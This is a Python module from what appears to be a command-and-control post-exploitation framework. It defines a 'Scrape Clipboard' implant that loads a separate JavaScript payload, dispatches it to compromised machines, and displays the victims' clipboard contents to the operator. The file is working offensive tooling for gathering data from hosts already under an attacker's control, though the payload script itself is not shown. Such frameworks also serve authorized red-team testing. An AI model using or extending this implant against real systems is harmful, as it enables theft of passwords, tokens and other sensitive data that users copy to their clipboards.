import core.job
import core.implant
import uuid

class ClipboardJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("Clipboard contents:")
        self.shell.print_plain(self.data)
        self.results = self.data

class ClipboardImplant(core.implant.Implant):

    NAME = "Scrape Clipboard"
    DESCRIPTION = "Gets the contents of the clipboard"
    AUTHORS = ["RiskSense, Inc."]

    def load(self):
        pass

    def job(self):
        return ClipboardJob

    def run(self):
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/gather/clipboard.js", self.options)
        self.dispatch(payloads, self.job)
